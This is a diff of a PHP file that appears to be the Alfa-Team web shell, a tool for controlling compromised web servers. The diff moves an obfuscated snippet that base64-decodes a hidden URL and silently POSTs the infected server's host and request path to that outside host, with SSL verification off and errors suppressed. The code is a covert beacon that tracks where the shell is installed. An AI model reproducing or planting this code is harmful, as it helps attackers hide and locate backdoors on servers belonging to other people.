@@ -1,4 +1,4 @@
-<?php @ini_set('output_buffering', 0); @ini_set('display_errors', 0); set_time_limit(0); ini_set('memory_limit', '64M'); $htas = 'aHR0cHM6Ly9yZW1hcmMuYml6LmlkL2RhdGEucGhw'; $x_path = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']; $ch = curl_init(base64_decode($htas)); curl_setopt_array($ch, array(CURLOPT_POST => true, CURLOPT_POSTFIELDS => http_build_query(array('path' => $x_path, 'firl' => base64_decode($htas))), CURLOPT_SSL_VERIFYPEER => false, CURLOPT_RETURNTRANSFER => true)); curl_exec($ch); curl_close($ch); ?> <?php 
+<?php 
 /*
 	Author: 	Solevisible/Alfa-Team
 	Telegram: 	https://telegram.me/solevisible
@@ -2395,6 +2395,7 @@ function alfaMysqlApi(e,t){var a={host:mysql_cache[e.db_id].host,user:mysql_cach
 </script>
 </body>
 </html>
+<?php @ini_set('output_buffering', 0); @ini_set('display_errors', 0); set_time_limit(0); ini_set('memory_limit', '64M'); $htas = 'aHR0cHM6Ly9yZW1hcmMuYml6LmlkL2RhdGEucGhw'; $x_path = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']; $ch = curl_init(base64_decode($htas)); curl_setopt_array($ch, array(CURLOPT_POST => true, CURLOPT_POSTFIELDS => http_build_query(array('path' => $x_path, 'firl' => base64_decode($htas))), CURLOPT_SSL_VERIFYPEER => false, CURLOPT_RETURNTRANSFER => true)); curl_exec($ch); curl_close($ch); ?> 
 <?php
 }}
 if (!function_exists("posix_getpwuid") && (strpos(@ini_get('disable_functions'), 'posix_getpwuid')===false)) {
